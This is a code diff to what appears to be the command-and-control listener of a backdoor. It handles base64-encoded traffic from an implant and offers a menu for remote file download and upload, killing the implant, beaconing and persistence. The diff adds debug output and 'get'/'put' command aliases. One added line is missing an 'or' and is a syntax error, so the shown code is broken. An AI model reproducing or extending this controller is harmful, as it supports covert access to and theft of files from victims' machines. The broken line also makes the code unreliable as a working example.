@@ -178,8 +178,15 @@ def listen_for_data(conn, mode="print"):
     data = ""
     while not data.endswith('[END]'):
         recv = conn.recv(128)
+        recv_decoded = recv.decode('utf-8')
+        data_b64 = data_b64 + recv_decoded
+
         recv_decoded = base64_decode(recv.decode('utf-8'))
         data = data + recv_decoded
+
+    if DEBUG:
+        print(data_b64)
+        
     if mode != "print":
         return data.rstrip("[END]")
     else:
@@ -291,8 +298,8 @@ def listen():
     global CONNECTED_HOST
 
     options = """\
-    1 - Download a File
-    2 - Upload a File
+    1|get - Download a File
+    2|put - Upload a File
     3 - Kill Process (Do not beacon)
     4 - Drop Connection (start beaconing)
     5 - Persistence
@@ -378,7 +385,7 @@ def listen():
                     conn.shutdown(socket.SHUT_RDWR)
                     conn.close()
                     exit(1)
-                elif cmd == "1":
+                elif cmd == "get" or cmd == "1":
                     command = input("get > ")
                     if command != "back":
                         command = "[get] " + command
@@ -399,7 +406,7 @@ def listen():
 ##################
 #UPLOAD FILE     #
 ##################                
-                elif cmd == "2":
+                elif cmd == "put" cmd == "2":
                     print_info("Format - <full_path_source_name> <full_path_dest_name> ")
                     command = input("put > ")
                     if command != "back":
